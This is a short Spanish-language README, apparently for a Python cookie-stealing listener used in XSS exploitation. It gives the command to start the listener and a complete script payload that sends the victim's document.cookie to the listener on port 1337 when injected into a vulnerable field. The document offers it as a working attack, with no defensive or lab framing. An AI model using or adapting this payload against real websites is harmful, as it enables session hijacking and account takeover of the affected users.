Este script nos permite capturar las cookies cuando tratamos de explotar un XSS.

Para ello crea un puerto de escucha donde recoge las cookies capturadas en la variable steal_cookie

# USO
-----
```
Python3 xss.py
```
----

![image](https://github.com/user-attachments/assets/09a080ad-9fd4-4400-80d1-b9256b2260a5)

Ahora debemos colocar este payload en el campo vulnerable a XSS:

---
```
<script>
new Image().src = "http://localhost:1337/?stolen_cookie=" + document.cookie;
</script>
```
----

![image](https://github.com/user-attachments/assets/deac6d3f-cf61-46f9-b4ba-4ea2952e86e3)

----

Una vez realizado esto ya obtenemos las cookies del usuario.

----
